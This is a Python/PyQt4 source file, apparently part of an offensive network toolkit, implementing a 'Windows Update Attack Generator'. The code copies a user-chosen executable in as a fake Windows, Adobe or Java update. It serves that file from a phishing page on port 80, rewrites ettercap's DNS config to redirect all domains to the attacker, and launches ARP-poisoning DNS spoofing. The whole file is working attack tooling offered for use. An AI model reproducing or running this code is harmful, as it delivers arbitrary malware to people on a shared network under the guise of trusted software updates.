from PyQt4.QtGui import *
from PyQt4.QtCore import *
from os import getcwd,popen,chdir,walk,path,remove,stat,getuid
from Modules.DHCPstarvation import frm_dhcp_Attack,conf_etter
from platform import linux_distribution
from Core.Settings import frm_Settings
from re import search
import threading
from shutil import copyfile
class frm_update_attack(QMainWindow):
    def __init__(self, parent=None):
        super(frm_update_attack, self).__init__(parent)
        self.form_widget = frm_WinSoftUp(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("Windows Update Attack Generator ")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        if theme != "theme2":
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())
        else:
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())

class frm_WinSoftUp(QWidget):
    def __init__(self, parent=None):
        super(frm_WinSoftUp, self).__init__(parent)

        self.Main = QVBoxLayout()
        self.control = None
        self.module2 = frm_dhcp_Attack()
        self.path_file = None
        self.owd = getcwd()
        self.GUI()
    def GUI(self):
        self.form = QFormLayout(self)
        self.grid = QGridLayout(self)
        self.grid1 = QGridLayout(self)
        self.path = QLineEdit(self)
        self.logBox = QListWidget(self)
        self.path.setFixedWidth(400)
        #combobox
        self.cb_interface = QComboBox(self)
        self.refresh_interface(self.cb_interface)

        #label
        self.lb_interface = QLabel("Network Adapter:")
        # buttons
        self.btn_open = QPushButton("...")
        self.btn_stop = QPushButton("Stop",self)
        self.btn_reload = QPushButton("refresh",self)
        self.btn_start_server = QPushButton("Start Server",self)
        # size
        self.btn_open.setMaximumWidth(90)
        self.btn_stop.setFixedHeight(50)
        self.btn_start_server.setFixedHeight(50)
        #icons
        self.btn_open.setIcon(QIcon("rsc/open.png"))
        self.btn_stop.setIcon(QIcon("rsc/Stop.png"))
        self.btn_reload.setIcon(QIcon("rsc/refresh.png"))
        self.btn_start_server.setIcon(QIcon("rsc/server.png"))

        # connect buttons
        self.btn_open.clicked.connect(self.getpath)
        self.btn_reload.clicked.connect(self.inter_get)
        self.btn_start_server.clicked.connect(self.server_start)
        self.btn_stop.clicked.connect(self.stop_attack)


        # radionButton
        self.rb_windows = QRadioButton("Windows Update",self)
        self.rb_windows.setIcon(QIcon("rsc/winUp.png"))
        self.rb_adobe = QRadioButton("Adobe Update", self)
        self.rb_adobe.setIcon(QIcon("rsc/adobe.png"))
        self.rb_java = QRadioButton("Java Update", self)
        self.rb_java.setIcon(QIcon("rsc/java.png"))
        self.grid.addWidget(self.rb_windows, 0,1)
        self.grid.addWidget(self.rb_adobe, 0,2)
        self.grid.addWidget(self.rb_java, 0,3)
        # check interface
        self.grid.addWidget(self.lb_interface,1,1)
        self.grid.addWidget(self.cb_interface,1,2)
        self.grid.addWidget(self.btn_reload, 1,3)

        #grid 2
        self.grid1.addWidget(self.btn_start_server,0,2)
        self.grid1.addWidget(self.btn_stop,0,4)

        #form add layout
        self.form.addRow(self.path,self.btn_open)
        self.form.addRow(self.grid)
        self.form.addRow(self.grid1)
        self.form.addRow(self.logBox)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def stop_attack(self):
        popen("killall xterm")
        self.alt_etter("")
        if path.isfile("Modules/Win-Explo/Windows_Update/index.html"):
            remove("Modules/Win-Explo/Windows_Update/index.html")
        if path.isfile("Modules/Win-Explo/Windows_Update/windows-update.exe"):
            remove("Modules/Win-Explo/Windows_Update/windows-update.exe")
        QMessageBox.information(self,"Clear Setting", "log cLear success ")

    def inter_get(self):
        self.refresh_interface(self.cb_interface)

    def refresh_interface(self,cb):
        self.module2 = frm_dhcp_Attack()
        cb.clear()
        n = self.module2.placa()
        for i,j in enumerate(n):
            if  self.module2.get_ip_local(n[i]) != None:
                if n[i] != "":
                    cb.addItem(n[i])

    def server_start(self):
        if len(self.path.text()) <= 0:
            QMessageBox.information(self, "Path file Error", "Error in get the file path.")
        else:
            if self.rb_windows.isChecked():
                directory = "Modules/Win-Explo/Windows_Update/"
                self.logBox.addItem("[+] Set page Attack.")
                try:
                    if path.isfile(directory+"windows-update.exe"):
                        remove(directory+"windows-update.exe")
                    copyfile(self.path_file,directory+"windows-update.exe")
                except OSError,e:
                    print e
                if not getuid() != 0:
                    file_html = open("Modules/Win-Explo/Settings_WinUpdate.html","r").read()
                    settings_html = file_html.replace("KBlenfile", str(self.getSize(self.path_file))+"KB")
                    if path.isfile(directory+"index.html"):
                        remove(directory+"index.html")
                    confFile = open(directory+"index.html","w")
                    confFile.write(settings_html)
                    confFile.close()
                    self.t = threading.Thread(target=self.threadServer,args=(directory,),)
                    self.t.daemon = True
                    self.t.start()
                else:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    self.logBox.clear()
                    if path.isfile(directory+"windows-update.exe"):
                        remove(directory+"windows-update.exe")

    def dns_start(self):
        if  self.control != None:
            self.logBox.addItem("[+] Settings Etter.dns.")
            ipaddress = self.module2.get_ip_local(str(self.cb_interface.currentText()))
            config_dns = ("* A %s"%(ipaddress))
            self.path_file_etter = self.find("etter.dns", "/etc/ettercap/")
            self.logBox.addItem("[+] check Path Ettercap.")
            if self.path_file_etter == None:
                self.path_file_etter = self.find("etter.dns", "/usr/share/ettercap/")
                if not  self.path_file_etter != None:
                    QMessageBox.information(self, 'Path not Found', "the file etter.dns not found check if ettercap this installed")
            if self.path_file_etter != None:
                self.alt_etter(config_dns)
                self.thread2 = threading.Thread(target=self.ThreadDNS, args=(str(self.cb_interface.currentText()),))
                self.thread2.daemon = True
                self.thread2.start()
        else:
            QMessageBox.information(self, 'Server Phishing Error', "Error not start Server...")

    def threadServer(self,directory):
        self.logBox.addItem("[+] Get IP local network.")
        ip = self.module2.get_ip_local(self.cb_interface.currentText())
        try:
            chdir(directory)
        except OSError:
            pass
        popen("service apache2 stop")
        self.control = 1
        n = (popen("""xterm -geometry 75x15-1+0 -T "Windows Fake update " -e php -S %s:80"""%(ip))).read() + "exit"
        chdir(self.owd)
        while n != "dsa":
            if n == "exit":
                self.logBox.clear()
                n = "dsa"
                self.control = None
                if path.isfile(directory+"index.html") and path.isfile(directory+"windows-update.exe"):
                    remove(directory+"windows-update.exe")
                    remove(directory+"index.html")
                break

    def ThreadDNS(self,interface):
        self.logBox.addItem("[+] Start Attack all DNS.")
        distro = linux_distribution()
        if search("Kali Linux",distro[0]):
            n = (popen("""xterm -geometry 75x15-1+250 -T "DNS SPOOF Attack On %s" -e ettercap -T -Q -M arp -i %s -P dns_spoof // //"""%(interface,interface)).read()) + "exit"
        else:
            n = (popen("""xterm -geometry 75x15-1+250 -T "DNS SPOOF Attack On %s" -e ettercap -T -Q -M arp -i %s -P dns_spoof """%(interface,interface)).read()) + "exit"
        while n != "dsa":
            if n == "exit":
                #self.dns_status(False)
                self.logBox.clear()
                n = "dsa"
                break

    def getpath(self):
        file = QFileDialog.getOpenFileName(self, 'Open Executable file',filter='*.exe')
        if len(file) > 0:
            self.path_file = file
            self.path.setText(file)

    def alt_etter(self,data):
        configure = conf_etter(data)
        file = open(self.path_file_etter, "w")
        file.write(configure)
        file.close()

    def find(self,name, paths):
        for root, dirs, files in walk(paths):
            if name in files:
                return path.join(root, name)

    def getSize(self,filename):
        st = stat(filename)
        return st.st_size